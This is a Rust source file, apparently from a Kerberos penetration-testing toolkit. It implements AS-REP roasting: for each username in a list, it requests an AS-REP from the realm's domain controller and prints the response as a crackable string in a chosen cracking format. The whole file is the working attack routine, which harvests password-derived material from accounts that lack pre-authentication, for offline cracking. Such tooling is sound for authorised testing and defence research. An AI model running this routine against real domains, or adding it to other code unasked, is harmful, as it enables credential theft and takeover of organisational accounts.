use crate::crack::{as_rep_to_crack_string, CrackFormat};
use crate::error::{Error, Result};
use crate::krb_user::KerberosUser;
use crate::requesters::request_as_rep;
use crate::transporter::KerberosTransporter;
use kerberos_crypto::Key;
use log::warn;

pub fn asreproast(
    realm: &str,
    usernames: Vec<String>,
    crack_format: CrackFormat,
    transporter: &dyn KerberosTransporter,
    cipher: &Key,
) -> Result<()> {
    for username in usernames.iter() {
        let user = KerberosUser::new(username.clone(), realm.to_string());

        let result = request_as_rep(&user, cipher, false, &*transporter);

        match result {
            Ok(as_rep) => {
                let crack_str =
                    as_rep_to_crack_string(username, &as_rep, crack_format);
                println!("{}", crack_str)
            }
            Err(err) => match &err {
                Error::KrbError(_) => {}
                Error::NetworkError(_, _) => return Err(err),
                Error::String(_) => warn!("{}", err),
            },
        }
    }

    return Ok(());
}
